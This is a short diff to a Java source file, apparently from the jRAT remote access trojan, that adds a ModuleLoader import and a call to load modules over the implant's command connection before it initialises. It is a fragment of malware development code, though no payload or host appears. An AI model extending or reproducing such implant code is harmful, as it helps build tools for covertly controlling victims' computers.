@@ -9,6 +9,7 @@ import io.jrat.common.crypto.CryptoUtils;
 import io.jrat.common.crypto.ObfuscatedStreamKeyExchanger;
 import io.jrat.common.crypto.StreamKeyExchanger;
 import io.jrat.common.io.StringWriter;
+import io.jrat.stub.modules.ModuleLoader;
 import io.jrat.stub.packets.incoming.AbstractIncomingPacket;
 import io.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import io.jrat.stub.packets.outgoing.Packet10InitInstallPath;
@@ -109,6 +110,8 @@ public class Connection implements Runnable {
 
 			this.dis = new DataInputStream(inputStream);
 			this.dos = new DataOutputStream(outputStream);
+
+            ModuleLoader.read(this);
 
 			initialize();
 
